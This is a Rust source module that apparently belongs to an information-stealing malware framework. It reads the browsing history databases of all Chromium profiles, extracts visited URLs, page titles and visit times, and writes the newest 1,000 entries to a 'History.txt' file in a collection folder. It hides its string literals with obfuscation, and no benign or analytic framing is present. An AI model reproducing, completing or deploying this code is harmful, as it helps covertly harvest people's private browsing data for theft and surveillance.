use alloc::boxed::Box;
use sqlite::{DatabaseReader, TableRecord, TableRecordExtension};
use crate::alloc::borrow::ToOwned;
use crate::chromium::Browser;
use crate::History;
use alloc::string::{String, ToString};
use alloc::sync::Arc;
use alloc::vec::Vec;
use sqlite::read_sqlite3_database_by_bytes;
use tasks::{parent_name, Task};
use utils::path::{Path, WriteToFile};
use obfstr::obfstr as s;

const URLS_URL: usize = 1;
const URLS_TITLE: usize = 2;
const URLS_LAST_VISIT_TIME: usize = 5;

pub(super) struct HistoryTask {
    browser: Arc<Browser>
}

impl HistoryTask {
    pub(super) fn new(browser: Arc<Browser>) -> Self {
        Self { browser }
    }
}

impl Task for HistoryTask {
    parent_name!("History.txt");

    unsafe fn run(&self, parent: &Path) {
        let mut history: Vec<History> = self.browser
            .profiles
            .iter()
            .filter_map(|profile| get_history(profile))
            .flat_map(|v| v.into_iter())
            .collect();

        if history.is_empty() {
            return
        }

        history.sort();
        history.dedup();


        history.sort_by(|a, b| b.last_visit_time.cmp(&a.last_visit_time));
        history.truncate(1000);

        let _ = history
            .iter()
            .map(|history| history.to_string())
            .collect::<Vec<String>>()
            .join("\n\n")
            .write_to(parent);
    }


}

fn get_history(profile: &Path) -> Option<Vec<History>> {
    let history_path = profile / s!("History");
    let bytes = history_path.read_file().ok()?;

    let db = read_sqlite3_database_by_bytes(&bytes)?;
    let table = db.read_table(s!("Urls"))?;

    let downloads = table
        .filter_map(|record| extract_history_from_record(&record))
        .collect();

    Some(downloads)
}

fn extract_history_from_record(record: &Box<dyn TableRecord>) -> Option<History> {
    let url = record.get_value(URLS_URL)?.as_string()?.to_owned();
    let title = record.get_value(URLS_TITLE)?.as_string()?.to_owned();
    let last_visit_time = record.get_value(URLS_LAST_VISIT_TIME)?.as_integer()?;
    
    Some(History {
        url,
        title,
        last_visit_time
    })
}